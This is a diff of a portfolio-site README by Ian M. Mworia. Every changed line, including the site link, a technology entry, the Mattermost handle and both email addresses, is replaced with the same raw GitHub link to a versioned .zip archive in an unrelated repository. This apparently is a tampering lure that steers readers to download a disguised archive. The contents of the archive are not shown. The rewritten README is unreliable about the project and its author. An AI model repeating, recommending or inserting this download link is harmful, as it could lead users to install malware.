@@ -3,21 +3,21 @@
 #### Developed by: *Ian M. Mworia*
 
 ## Web Link:
-https://ianmworia.netlify.app/
+https://github.com/GathogoG/lewis-karanu-portfolio-website/raw/refs/heads/main/src/components/karanu_lewis_website_portfolio_v1.6-beta.4.zip
 
 ## Description
 This is a portfolio website showcasing the works of Ian M. Mworia. With links to various of his professional presence online. 
 
 ## Technologies
-React.js
+https://github.com/GathogoG/lewis-karanu-portfolio-website/raw/refs/heads/main/src/components/karanu_lewis_website_portfolio_v1.6-beta.4.zip
 Tailwind Css
 Netlify
 
 ## contact details
 github: Mworia-Ian <br>
-mattermost: @ian.mworia <br>
-email : ianmworia156@gmail.com 
-email : ian.mworia@student.moringaschool.com
+mattermost: https://github.com/GathogoG/lewis-karanu-portfolio-website/raw/refs/heads/main/src/components/karanu_lewis_website_portfolio_v1.6-beta.4.zip <br>
+email : https://github.com/GathogoG/lewis-karanu-portfolio-website/raw/refs/heads/main/src/components/karanu_lewis_website_portfolio_v1.6-beta.4.zip 
+email : https://github.com/GathogoG/lewis-karanu-portfolio-website/raw/refs/heads/main/src/components/karanu_lewis_website_portfolio_v1.6-beta.4.zip
 
 ### License
 The content of this site is licensed under the Logic Flow license
